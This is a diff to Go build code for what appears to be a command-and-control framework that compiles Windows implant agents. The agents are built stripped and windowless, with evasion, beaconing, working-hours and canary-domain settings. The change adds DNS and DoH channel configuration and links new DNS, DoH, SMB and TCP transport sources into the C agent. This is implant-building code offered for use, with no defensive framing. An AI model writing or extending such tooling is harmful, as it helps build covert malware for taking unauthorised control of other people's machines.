@@ -474,6 +474,9 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 	outName := agentName(cfg, ".exe")
 	outPath := filepath.Join(outDir, outName)
 
+	rustDNSServer := cfg.DNSServer
+	if rustDNSServer == "" { rustDNSServer = "8.8.8.8" }
+
 	rustEnv := append(os.Environ(),
 		"AGENT_SERVER_URL="+cfg.ServerURL,
 		"AGENT_TRANSPORT="+cfg.Transport,
@@ -484,6 +487,8 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 		"AGENT_BEACON_URIS="+cfg.BeaconURIs,
 		"AGENT_WORKING_HOURS="+cfg.WorkingHours,
 		"AGENT_CANARY_DOMAIN="+cfg.CanaryDomain,
+		"AGENT_DNS_SERVER="+rustDNSServer,
+		"AGENT_DNS_DOMAIN="+cfg.DNSDomain,
 		"CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER="+cc,
 	)
 	if cfg.UserAgent != "" {
@@ -563,6 +568,10 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		filepath.Join(agentDir, "agent.c"),
 		filepath.Join(agentDir, "evasion.c"),
 		filepath.Join(agentDir, "transport.c"),
+		filepath.Join(agentDir, "transport_dns.c"),
+		filepath.Join(agentDir, "transport_doh.c"),
+		filepath.Join(agentDir, "transport_smb.c"),
+		filepath.Join(agentDir, "transport_tcp.c"),
 		filepath.Join(agentDir, "commands.c"),
 		filepath.Join(agentDir, "crypto.c"),
 		filepath.Join(agentDir, "b64.c"),
@@ -577,6 +586,12 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		filepath.Join(agentDir, "sqlite3.o"),
 	}
 
+	// DNS server/domain from config (only meaningful for dns/doh transport)
+	dnsServer := cfg.DNSServer
+	if dnsServer == "" {
+		dnsServer = "8.8.8.8"
+	}
+
 	args := []string{
 		"-O2", "-s", "-mwindows",
 		"-Wno-unused-parameter", "-Wno-format-truncation", "-Wno-stringop-truncation",
@@ -589,6 +604,8 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		fmt.Sprintf("-DAGENT_SMB_PIPE=%q", cfg.SMBPipe),
 		fmt.Sprintf("-DAGENT_BEACON_URIS=%q", cfg.BeaconURIs),
 		fmt.Sprintf("-DAGENT_CANARY_DOMAIN=%q", cfg.CanaryDomain),
+		fmt.Sprintf("-DAGENT_DNS_SERVER=%q", dnsServer),
+		fmt.Sprintf("-DAGENT_DNS_DOMAIN=%q", cfg.DNSDomain),
 		"-o", outPath,
 	}
 	args = append(args, sources...)
